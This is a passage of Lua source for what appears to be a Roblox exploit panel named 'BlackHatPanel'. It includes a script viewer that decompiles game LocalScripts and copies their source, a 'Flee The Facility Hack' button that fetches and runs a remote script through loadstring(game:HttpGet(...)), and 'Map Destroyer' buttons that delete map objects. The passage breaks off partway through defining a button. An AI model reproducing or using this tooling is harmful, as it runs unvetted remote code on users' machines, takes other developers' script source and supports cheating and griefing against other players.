			if not template then
				template = Instance.new("Frame")
				template.BorderSizePixel = 0
			end

			spacing = spacing or 2

			local scale
			if scaled then
				function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
			else
				function scale(p) return p end
			end

			if dir == 'Vertical' then
				for i=0,size.x-1,spacing do
					local t = template:Clone()
					t.Size = scale(UDim2.new(0,1,0,size.y))
					t.Position = scale(UDim2.new(0,i,0,0))
					t.Parent = Frame
				end
			elseif dir == nil or dir == 'Horizontal' then
				for i=0,size.y-1,spacing do
					local t = template:Clone()
					t.Size = scale(UDim2.new(0,size.x,0,1))
					t.Position = scale(UDim2.new(0,0,0,i))
					t.Parent = Frame
				end
			end

			return Frame
		end

		do
			local mt = {
				__index = {
					GetScrollPercent = function(self)
						return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
					end;
					CanScrollDown = function(self)
						return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
					end;
					CanScrollUp = function(self)
						return self.ScrollIndex > 0
					end;
					ScrollDown = function(self)
						self.ScrollIndex = self.ScrollIndex + self.PageIncrement
						self:Update()
					end;
					ScrollUp = function(self)
						self.ScrollIndex = self.ScrollIndex - self.PageIncrement
						self:Update()
					end;
					ScrollTo = function(self,index)
						self.ScrollIndex = index
						self:Update()
					end;
					SetScrollPercent = function(self,percent)
						self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
						self:Update()
					end;
				};
			}
			mt.__index.CanScrollRight = mt.__index.CanScrollDown
			mt.__index.CanScrollLeft = mt.__index.CanScrollUp
			mt.__index.ScrollLeft = mt.__index.ScrollUp
			mt.__index.ScrollRight = mt.__index.ScrollDown

			function ScrollBar(horizontal)
				-- create row scroll bar
				local ScrollFrame = Create('Frame',{
					Name = "ScrollFrame";
					Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
					Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
					BackgroundTransparency = 1;
					Create('ImageButton',{
						Name = "ScrollDown";
						Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
						Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
						BackgroundColor3 = ScrollStyles.Button;
						BorderColor3 = ScrollStyles.Border;
						--BorderSizePixel = 0;
					});
					Create('ImageButton',{
						Name = "ScrollUp";
						Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
						BackgroundColor3 = ScrollStyles.Button;
						BorderColor3 = ScrollStyles.Border;
						--BorderSizePixel = 0;
					});
					Create('ImageButton',{
						Name = "ScrollBar";
						Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
						Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
						AutoButtonColor = false;
						BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
						BorderColor3 = ScrollStyles.Border;
						--BorderSizePixel = 0;
						Create('ImageButton',{
							Name = "ScrollThumb";
							AutoButtonColor = false;
							Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
							BackgroundColor3 = ScrollStyles.Button;
							BorderColor3 = ScrollStyles.Border;
							--BorderSizePixel = 0;
						});
					});
				})

				local graphicTemplate = Create('Frame',{
					Name="Graphic";
					BorderSizePixel = 0;
					BackgroundColor3 = ScrollStyles.Border;
				})
				local graphicSize = ScrollBarWidth/2

				local ScrollDownFrame = ScrollFrame.ScrollDown
				local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
				ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
				ScrollDownGraphic.Parent = ScrollDownFrame
				local ScrollUpFrame = ScrollFrame.ScrollUp
				local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
				ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
				ScrollUpGraphic.Parent = ScrollUpFrame
				local ScrollBarFrame = ScrollFrame.ScrollBar
				local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
				do
					local size = ScrollBarWidth*3/8
					local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
					Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
					Decal.Parent = ScrollThumbFrame
				end

				local MouseDrag = Create('ImageButton',{
					Name = "MouseDrag";
					Position = UDim2.new(-0.25,0,-0.25,0);
					Size = UDim2.new(1.5,0,1.5,0);
					Transparency = 1;
					AutoButtonColor = false;
					Active = true;
					ZIndex = 10;
				})

				local Class = setmetatable({
					GUI = ScrollFrame;
					ScrollIndex = 0;
					VisibleSpace = 0;
					TotalSpace = 0;
					PageIncrement = 1;
				},mt)

				local UpdateScrollThumb
				if horizontal then
					function UpdateScrollThumb()
						ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,ScrollBarWidth)
						if ScrollThumbFrame.AbsoluteSize.x < ScrollBarWidth then
							ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
						end
						local barSize = ScrollBarFrame.AbsoluteSize.x
						ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
					end
				else
					function UpdateScrollThumb()
						ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,Class.VisibleSpace/Class.TotalSpace,0)
						if ScrollThumbFrame.AbsoluteSize.y < ScrollBarWidth then
							ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
						end
						local barSize = ScrollBarFrame.AbsoluteSize.y
						ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
					end
				end

				local lastDown
				local lastUp
				local scrollStyle = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0}
				local scrollStyle_ds = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0.7}

				local function Update()
					local t = Class.TotalSpace
					local v = Class.VisibleSpace
					local s = Class.ScrollIndex
					if v <= t then
						if s > 0 then
							if s + v > t then
								Class.ScrollIndex = t - v
							end
						else
							Class.ScrollIndex = 0
						end
					else
						Class.ScrollIndex = 0
					end

					if Class.UpdateCallback then
						if Class.UpdateCallback(Class) == false then
							return
						end
					end

					local down = Class:CanScrollDown()
					local up = Class:CanScrollUp()
					if down ~= lastDown then
						lastDown = down
						ScrollDownFrame.Active = down
						ScrollDownFrame.AutoButtonColor = down
						local children = ScrollDownGraphic:GetChildren()
						local style = down and scrollStyle or scrollStyle_ds
						for i = 1,#children do
							Create(children[i],style)
						end
					end
					if up ~= lastUp then
						lastUp = up
						ScrollUpFrame.Active = up
						ScrollUpFrame.AutoButtonColor = up
						local children = ScrollUpGraphic:GetChildren()
						local style = up and scrollStyle or scrollStyle_ds
						for i = 1,#children do
							Create(children[i],style)
						end
					end
					ScrollThumbFrame.Visible = down or up
					UpdateScrollThumb()
				end
				Class.Update = Update

				SetZIndexOnChanged(ScrollFrame)

				local scrollEventID = 0
				ScrollDownFrame.MouseButton1Down:connect(function()
					scrollEventID = tick()
					local current = scrollEventID
					local up_con
					up_con = MouseDrag.MouseButton1Up:connect(function()
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollDownFrame)
						up_con:disconnect(); drag = nil
					end)
					MouseDrag.Parent = GetScreen(ScrollFrame)
					Class:ScrollDown()
					wait(0.2) -- delay before auto scroll
					while scrollEventID == current do
						Class:ScrollDown()
						if not Class:CanScrollDown() then break end
						wait()
					end
				end)

				ScrollDownFrame.MouseButton1Up:connect(function()
					scrollEventID = tick()
				end)

				ScrollUpFrame.MouseButton1Down:connect(function()
					scrollEventID = tick()
					local current = scrollEventID
					local up_con
					up_con = MouseDrag.MouseButton1Up:connect(function()
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollUpFrame)
						up_con:disconnect(); drag = nil
					end)
					MouseDrag.Parent = GetScreen(ScrollFrame)
					Class:ScrollUp()
					wait(0.2)
					while scrollEventID == current do
						Class:ScrollUp()
						if not Class:CanScrollUp() then break end
						wait()
					end
				end)

				ScrollUpFrame.MouseButton1Up:connect(function()
					scrollEventID = tick()
				end)

				if horizontal then
					ScrollBarFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local current = scrollEventID
						local up_con
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollUpFrame)
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
						if x > ScrollThumbFrame.AbsolutePosition.x then
							Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
								Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
								wait()
							end
						else
							Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if x > ScrollThumbFrame.AbsolutePosition.x then break end
								Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
								wait()
							end
						end
					end)
				else
					ScrollBarFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local current = scrollEventID
						local up_con
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollUpFrame)
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
						if y > ScrollThumbFrame.AbsolutePosition.y then
							Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
								Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
								wait()
							end
						else
							Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if y > ScrollThumbFrame.AbsolutePosition.y then break end
								Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
								wait()
							end
						end
					end)
				end

				if horizontal then
					ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
						local drag_con
						local up_con
						drag_con = MouseDrag.MouseMoved:connect(function(x,y)
							local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
							local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
							local bar_abs_one = bar_abs_pos + bar_drag
							x = x - mouse_offset
							x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
							x = x - bar_abs_pos
							Class:SetScrollPercent(x/(bar_drag))
						end)
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollThumbFrame)
							drag_con:disconnect(); drag_con = nil
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
					end)
				else
					ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
						local drag_con
						local up_con
						drag_con = MouseDrag.MouseMoved:connect(function(x,y)
							local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
							local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
							local bar_abs_one = bar_abs_pos + bar_drag
							y = y - mouse_offset
							y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
							y = y - bar_abs_pos
							Class:SetScrollPercent(y/(bar_drag))
						end)
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollThumbFrame)
							drag_con:disconnect(); drag_con = nil
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
					end)
				end

				function Class:Destroy()
					ScrollFrame:Destroy()
					MouseDrag:Destroy()
					for k in pairs(Class) do
						Class[k] = nil
					end
					setmetatable(Class,nil)
				end

				Update()

				return Class
			end
		end

		-- End Scrollbar

		local scrollBar = ScrollBar(false)
		scrollBar.PageIncrement = 16
		Create(scrollBar.GUI,{
			Position = UDim2.new(1,0,0,0);
			Size = UDim2.new(0,ScrollBarWidth,1,0);
			Parent = editorGrid;
		})

		local scrollBarH = ScrollBar(true)
		scrollBarH.PageIncrement = 8
		Create(scrollBarH.GUI,{
			Position = UDim2.new(0,0,1,0);
			Size = UDim2.new(1,0,0,ScrollBarWidth);
			Parent = editorGrid;
		})

		local entries = {}

		local grid = {}

		local count = 1
		local xCount = 1

		local lineSpan = 0

		for i = 0,490,8 do
			local newRow = {}
			for j = 0,390,16 do
				local cellText = Instance.new("TextLabel",editorGrid)
				cellText.BackgroundTransparency = 1
				cellText.BorderSizePixel = 0
				cellText.Text = ""
				cellText.Position = UDim2.new(0,i,0,j)
				cellText.Size = UDim2.new(0,8,0,16)
				cellText.Font = Enum.Font.SourceSans
				cellText.FontSize = Enum.FontSize.Size18
				table.insert(newRow,cellText)
				xCount = xCount + 1
			end
			table.insert(grid,newRow)
			count = count + 1
			xCount = 1
		end

		local syntaxHighlightList = {
			{["Keyword"] = "for", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "local", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "if", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "then", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "do", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "while", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "end", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "function", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "string", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "table", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "game", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "workspace", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "return", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "break", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "elseif", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "in", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "pairs", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
			{["Keyword"] = "ipairs", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true}
		}

		function checkMouseInGui(gui)
			if gui == nil then return false end
			local plrMouse = game.Players.LocalPlayer:GetMouse()
			local guiPosition = gui.AbsolutePosition
			local guiSize = gui.AbsoluteSize	

			if plrMouse.X >= guiPosition.x and plrMouse.X <= guiPosition.x + guiSize.x and plrMouse.Y >= guiPosition.y and plrMouse.Y <= guiPosition.y + guiSize.y then
				return true
			else
				return false
			end
		end

		function AddZeros(num,reach)
			local toConvert = tostring(num)
			while #toConvert < reach do
				toConvert = " "..toConvert
			end
			return toConvert
		end

		function buildScript(source,xOff,yOff,override)
			local buildingRows = true
			local buildScr = source

			local totalLines = 0

			--print(xOff,yOff)

			if currentSource ~= source then
				currentSource = source
			end

			if override then
				currentSource = source
				entries = {}
				while buildingRows do
					local x,y = string.find(buildScr,"\n")
					if x and y then
						table.insert(entries,string.sub(buildScr,1,y))
						buildScr = string.sub(buildScr,y+1,string.len(buildScr))
					else
						buildingRows = false
						table.insert(entries,buildScr)
					end
				end
			end

			totalLines = #entries
			lineSpan = #tostring(totalLines)

			if lineSpan == 1 then lineSpan = 2 end

			local currentRow = 1
			local currentColumn = 2 + lineSpan

			local colorTime = 0
			local colorReplace = nil

			local inString = false

			local workingEntries = entries

	--[[
	for i,v in pairs(entries) do
		table.insert(workingEntries,v)
	end
	
	for i = 1,yOff do
		table.remove(workingEntries,1)
	end
	--]]

			local delayance = xOff

			for i = 1,#grid do
				for j = 1,#grid[i] do
					if i <= lineSpan then
						local newNum = AddZeros(yOff + j,lineSpan)
						local newDigit =  string.sub(newNum,i,i)
						if newDigit == " " then
							grid[i][j].Text = ""
						else
							grid[i][j].Text = newDigit
						end
						grid[i][j].BackgroundTransparency = 0
						grid[i][j].BackgroundColor3 = Color3.new(163/255, 162/255, 165/255)
						--grid[i][j].Font = Enum.Font.SourceSansBold
					elseif i == lineSpan + 1 then
						grid[i][j].Text = ""
						grid[i][j].BackgroundTransparency = 0
						grid[i][j].BackgroundColor3 = Color3.new(200/255, 200/255, 200/255)
						--grid[i][j].Font = Enum.Font.SourceSans
					else
						grid[i][j].Text = ""
						grid[i][j].BackgroundTransparency = 1
						--grid[i][j].Font = Enum.Font.SourceSans
					end
				end
			end

			while true do
				if currentRow > #workingEntries or currentRow > #grid[1] then break end
				local entry = workingEntries[currentRow+yOff]
				while string.len(entry) > 0 do
					if string.sub(entry,1,1) == "\t" then entry = "    "..string.sub(entry,2) end

					if currentColumn > #grid then break end

					if delayance == 0 then
						grid[currentColumn][currentRow].Text = string.sub(entry,1,1)
					end

					-- Coloring

					if not inString then
						for i,v in pairs(syntaxHighlightList) do
							if string.sub(entry,1,string.len(v["Keyword"])) == v["Keyword"] then
								if v["Independent"] then
									local outCheck = string.len(v["Keyword"])+1
									local outEntry = string.sub(entry,outCheck,outCheck)
									if not string.find(outEntry,"%w") then
										colorTime = string.len(v["Keyword"])
										colorReplace = v["Color"]
									end
								else
									colorTime = string.len(v["Keyword"])
									colorReplace = v["Color"]
								end
							end
						end
					end

					if string.sub(entry,1,1) == "\"" and string.match(entry,"\".+\"") then
						inString = true
						colorTime = string.len(string.match(entry,"\".+\""))
						colorReplace = Color3.new(170/255, 0, 1)
					end

					if colorTime > 0 then
						colorTime = colorTime - 1
						grid[currentColumn][currentRow].TextColor3 = colorReplace
						if colorTime == 0 then inString = false end
					else
						grid[currentColumn][currentRow].TextColor3 = Color3.new(0,0,0)
						inString = false
					end

					if delayance == 0 then
						currentColumn = currentColumn + 1
					else
						delayance = delayance - 1
					end
					entry = string.sub(entry,2,string.len(entry))
				end
				currentRow = currentRow + 1
				currentColumn = 2 + lineSpan
				colorTime = 0
				delayance = xOff
				inString = false
			end
		end

		function scrollBar.UpdateCallback(self)
			scrollBar.TotalSpace = #entries * 16
			scrollBar.VisibleSpace = editorGrid.AbsoluteSize.Y
			buildScript(currentSource,math.floor(scrollBarH.ScrollIndex/8),math.floor(scrollBar.ScrollIndex/16))
		end

		function scrollBarH.UpdateCallback(self)
			scrollBarH.TotalSpace = (getLongestEntry(entries) + 1 + lineSpan) * 8
			scrollBarH.VisibleSpace = editorGrid.AbsoluteSize.X
			buildScript(currentSource,math.floor(scrollBarH.ScrollIndex/8),math.floor(scrollBar.ScrollIndex/16))
		end

		function getLongestEntry(tab)
			local longest = 0
			for i,v in pairs(tab) do
				if string.len(v) > longest then
					longest = string.len(v)
				end
			end
			return longest
		end

		function openScript(scrObj)
			if scrObj:IsA("LocalScript") then
				scrObj.Archivable = true
				scrObj = scrObj:Clone()
				scrObj.Disabled = true
			end

			local scrName = scrObj.Name
			local scrSource = decompile(scrObj)

			table.insert(memoryScripts,{Name = scrName,Source = scrSource})

			local newTab = entryTemplate:Clone()
			newTab.Button.Text = scrName
			newTab.Position = UDim2.new(0,#scriptBar:GetChildren() * 100,0,0)
			newTab.Visible = true

			newTab.Button.MouseButton1Down:connect(function()
				for i,v in pairs(scriptBar:GetChildren()) do
					if v == newTab then
						editingIndex = i
						buildScript(memoryScripts[i].Source,0,0,true)
						scrollBar:ScrollTo(1)
						scrollBar:Update()
						scrollBarH:ScrollTo(1)
						scrollBarH:Update()
					end
				end
			end)

			newTab.Close.MouseButton1Click:connect(function()
				for i,v in pairs(scriptBar:GetChildren()) do
					if v == newTab then
						table.remove(memoryScripts,i)
						if editingIndex == i then
							editingIndex = #memoryScripts
							if editingIndex > 0 then
								buildScript(memoryScripts[#memoryScripts].Source,0,0,true)
							else
								buildScript("",0,0,true)
							end
						end

						scrollBar:ScrollTo(1)
						scrollBar:Update()
						scrollBarH:ScrollTo(1)
						scrollBarH:Update()

						for i2 = i,#scriptBar:GetChildren() do
							scriptBar:GetChildren()[i2].Position = scriptBar:GetChildren()[i2].Position + UDim2.new(0,-100,0,0)
						end
						if editingIndex > i then
							editingIndex = editingIndex - 1
						end
						newTab:Destroy()
					end
				end
			end)

			editingIndex = #memoryScripts
			buildScript(scrSource,0,0,true)

			newTab.Parent = scriptBar
		end

		function updateScriptBar()
			local entryCount = 0

			scriptBarLeft.Active = false
			scriptBarLeft.AutoButtonColor = false
			for i,v in pairs(scriptBarLeft["Arrow Graphic"]:GetChildren()) do
				v.BackgroundTransparency = 0.7
			end
			scriptBarRight.Active = false
			scriptBarRight.AutoButtonColor = false
			for i,v in pairs(scriptBarRight["Arrow Graphic"]:GetChildren()) do
				v.BackgroundTransparency = 0.7
			end
			for i,v in pairs(scriptBar:GetChildren()) do
				if v.Position.X.Offset < 0 then
					scriptBarLeft.Active = true
					scriptBarLeft.AutoButtonColor = true
					for i,v in pairs(scriptBarLeft["Arrow Graphic"]:GetChildren()) do
						v.BackgroundTransparency = 0
					end
				elseif v.Position.X.Offset >= 0 then
					entryCount = entryCount + 1
					if entryCount == 5 then
						scriptBarRight.Active = true
						scriptBarRight.AutoButtonColor = true
						for i,v in pairs(scriptBarRight["Arrow Graphic"]:GetChildren()) do
							v.BackgroundTransparency = 0
						end
					end
				end
			end
		end

		scriptBar.ChildAdded:connect(updateScriptBar)
		scriptBar.ChildRemoved:connect(updateScriptBar)

		scriptBarLeft.MouseButton1Click:connect(function()
			if scriptBarLeft.Active == false then return end
			for i,v in pairs(scriptBar:GetChildren()) do
				v.Position = v.Position + UDim2.new(0,100,0,0)
			end
			updateScriptBar()
		end)

		scriptBarRight.MouseButton1Click:connect(function()
			if scriptBarRight.Active == false then return end
			for i,v in pairs(scriptBar:GetChildren()) do
				v.Position = v.Position + UDim2.new(0,-100,0,0)
			end
			updateScriptBar()
		end)

		mouse.Button1Down:connect(function()
			if checkMouseInGui(editorGrid) then
				--print("LETS EDIT!")
			end
		end)

		openEvent.Event:connect(function(...)
			top.Visible = true
			local args = {...}
			if #args > 0 then
				openScript(args[1])
			end
		end)

		clipboardButton.MouseButton1Click:connect(function()
			if Clipboard and Clipboard.set then
				Clipboard.set(currentSource)
			elseif CopyString then
				CopyString(currentSource)
			end
		end)

		closeButton.MouseButton1Click:connect(function()
			top.Visible = false
		end)

--[[
local scr = script.Parent:WaitForChild("Scr")
local scr2 = script.Parent:WaitForChild("Scr2")
local scr3 = script.Parent:WaitForChild("Scr3")
local scr4 = script.Parent:WaitForChild("TOS")
local scr5 = script.Parent:WaitForChild("HW")
--]]

		buildScript("",0,0,true)
--[[
openScript(scr)
openScript(scr2)
openScript(scr3)
openScript(scr4)
openScript(scr5)
--]]

		scrollBar:Update()
		scrollBarH:Update()
	end)

	--moony
end)

UICorner_5.CornerRadius = UDim.new(0, 20)
UICorner_5.Parent = DevExplore

FleeTheFacility.Name = "FleeTheFacility"
FleeTheFacility.Parent = HomeLol
FleeTheFacility.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
FleeTheFacility.BorderSizePixel = 0
FleeTheFacility.Position = UDim2.new(0.574974179, 0, 0.19568345, 0)
FleeTheFacility.Size = UDim2.new(0, 211, 0, 47)
FleeTheFacility.Font = Enum.Font.Gotham
FleeTheFacility.Text = "Flee The Facility Hack"
FleeTheFacility.TextColor3 = Color3.fromRGB(255, 255, 255)
FleeTheFacility.TextScaled = true
FleeTheFacility.TextSize = 14.000
FleeTheFacility.TextWrapped = true
FleeTheFacility.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/khoaScript/scripts/master/flee-the-facility.lua"))()
end)

UICorner_9.CornerRadius = UDim.new(0, 20)
UICorner_9.Parent = FleeTheFacility

Bar_2.Name = "Bar"
Bar_2.Parent = BlackHatPanel
Bar_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Bar_2.BorderColor3 = Color3.fromRGB(99, 99, 99)
Bar_2.Position = UDim2.new(0, 0, 0.928057551, 0)
Bar_2.Size = UDim2.new(0, 967, 0, 0)

Credits.Name = "Credits"
Credits.Parent = BlackHatPanel
Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Credits.BackgroundTransparency = 1.000
Credits.BorderSizePixel = 0
Credits.Position = UDim2.new(0.564632893, 0, 0, 0)
Credits.Size = UDim2.new(0, 200, 0, 43)
Credits.Font = Enum.Font.Gotham
Credits.Text = "Credits"
Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
Credits.TextScaled = true
Credits.TextSize = 14.000
Credits.TextWrapped = true

MapDestroyer.Name = "MapDestroyer"
MapDestroyer.Parent = BlackHatPanel
MapDestroyer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MapDestroyer.BackgroundTransparency = 1.000
MapDestroyer.BorderSizePixel = 0
MapDestroyer.Position = UDim2.new(0.167528436, 0, 0, 0)
MapDestroyer.Size = UDim2.new(0, 200, 0, 43)
MapDestroyer.Font = Enum.Font.Gotham
MapDestroyer.Text = "Map Destroyer"
MapDestroyer.TextColor3 = Color3.fromRGB(255, 255, 255)
MapDestroyer.TextScaled = true
MapDestroyer.TextSize = 14.000
MapDestroyer.TextWrapped = true

Home.Name = "Home"
Home.Parent = BlackHatPanel
Home.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Home.BackgroundTransparency = 1.000
Home.BorderSizePixel = 0
Home.Size = UDim2.new(0, 162, 0, 43)
Home.Font = Enum.Font.Gotham
Home.Text = "Home"
Home.TextColor3 = Color3.fromRGB(255, 255, 255)
Home.TextScaled = true
Home.TextSize = 14.000
Home.TextWrapped = true

MapDestroyerLol.Name = "MapDestroyerLol"
MapDestroyerLol.Parent = BlackHatPanel
MapDestroyerLol.Active = true
MapDestroyerLol.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
MapDestroyerLol.BorderSizePixel = 0
MapDestroyerLol.Position = UDim2.new(0, 0, 0.0618705042, 0)
MapDestroyerLol.Size = UDim2.new(0, 967, 0, 602)
MapDestroyerLol.Visible = false

City_buildings.Name = "City_buildings"
City_buildings.Parent = MapDestroyerLol
City_buildings.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
City_buildings.BorderSizePixel = 0
City_buildings.Position = UDim2.new(0.564632893, 0, 0.142857149, 0)
City_buildings.Size = UDim2.new(0, 200, 0, 50)
City_buildings.Font = Enum.Font.Gotham
City_buildings.Text = "City_buildings"
City_buildings.TextColor3 = Color3.fromRGB(255, 255, 255)
City_buildings.TextScaled = true
City_buildings.TextSize = 14.000
City_buildings.TextWrapped = true
City_buildings.MouseButton1Click:Connect(function()
	City:Destroy()
end)

UICorner_10.CornerRadius = UDim.new(0, 20)
UICorner_10.Parent = City_buildings

Island_abandoned.Name = "Island_abandoned"
Island_abandoned.Parent = MapDestroyerLol
Island_abandoned.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Island_abandoned.BorderSizePixel = 0
Island_abandoned.Position = UDim2.new(0.0723888278, 0, 0.8521595, 0)
Island_abandoned.Size = UDim2.new(0, 200, 0, 50)
Island_abandoned.Font = Enum.Font.Gotham
Island_abandoned.Text = "Island_abandoned"
Island_abandoned.TextColor3 = Color3.fromRGB(255, 255, 255)
Island_abandoned.TextScaled = true
Island_abandoned.TextSize = 14.000
Island_abandoned.TextWrapped = true
Island_abandoned.MouseButton1Click:Connect(function()
	Island_lol:Destroy()
end)

UICorner_11.CornerRadius = UDim.new(0, 20)
UICorner_11.Parent = Island_abandoned

Island.Name = "Island"
Island.Parent = MapDestroyerLol
Island.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Island.BorderSizePixel = 0
Island.Position = UDim2.new(0.0723888278, 0, 0.54651165, 0)
Island.Size = UDim2.new(0, 200, 0, 50)
Island.Font = Enum.Font.Gotham
Island.Text = "Island"
Island.TextColor3 = Color3.fromRGB(255, 255, 255)
Island.TextScaled = true
Island.TextSize = 14.000
Island.TextWrapped = true
Island.MouseButton1Click:Connect(function()
	Island_sus:Destroy()
end)

UICorner_12.CornerRadius = UDim.new(0, 20)
UICorner_12.Parent = Island

Prison_Cellblock.Name = "Prison_Cellblock"
Prison_Cellblock.Parent = MapDestroyerLol
Prison_Cellblock.BackgroundColor3 = Color3.fromRGB(13, 13, 13)
Prison_Cellblock.BorderSizePixel = 0
Prison_Cellblock.Position = UDim2.new(0.313340217, 0, 0.308970094, 0)
Prison_Cellblock.Size = UDim2.new(0, 200, 0, 50)
Prison_Cellblock.Font = Enum.Font.Gotham
Prison_Cellblock.Text = "Prison_Cellblock"
Prison_Cellblock.TextColor3 = Color3.fromRGB(255, 255, 255)
Prison_Cellblock.TextScaled = true
